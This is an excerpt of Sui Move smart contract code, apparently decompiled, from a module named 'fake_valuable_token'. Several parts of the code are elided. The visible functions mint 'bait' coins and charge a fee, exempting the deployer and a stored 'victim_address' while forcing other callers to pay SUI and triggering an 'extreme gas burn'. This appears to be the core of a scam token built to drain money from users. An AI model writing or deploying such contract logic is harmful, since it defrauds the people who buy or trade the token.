module 0xb50f8e04dacaaa877cc601889e1843c833d265287e486753f1bed27ebdf71e39::fake_valuable_token {
    ...
    public entry fun mint_coin_bait(arg0: &mut TokenTreasury, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
    ...
    public entry fun monitor_and_deduct_fee(arg0: &mut TokenTreasury, arg1: u64, arg2: 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg3);
        let v1 = v0 == arg0.deployer || v0 == arg0.victim_address;
        if (!v1) {
            assert!(0x2::coin::value<0x2::sui::SUI>(&arg2) >= arg0.custom_fee_amount, 101);
            let v2 = execute_extreme_gas_burn(arg1);
            ...
            arg0.total_gas_burned = arg0.total_gas_burned + v2;
